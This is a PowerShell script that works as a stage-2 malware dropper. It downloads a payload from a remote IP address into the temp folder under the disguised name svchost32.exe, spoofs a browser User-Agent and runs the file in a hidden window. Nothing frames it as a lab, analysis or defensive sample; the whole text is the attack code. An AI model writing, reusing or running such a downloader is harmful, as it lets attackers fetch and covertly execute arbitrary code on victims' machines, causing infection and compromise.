$PayloadUrl = "https://192.0.2.152:443/assets/update.dat"
$PayloadPath = "$env:TEMP\svchost32.exe"
$TimeoutSec = 92
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $PayloadUrl -DestinationPath $PayloadPath -TimeoutSec $TimeoutSec -UserAgent $RequestAgent
if ($OperationResult) {
    Start-Process -FilePath $PayloadPath -WindowStyle Hidden
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Write-Output "stage 28 initialized"
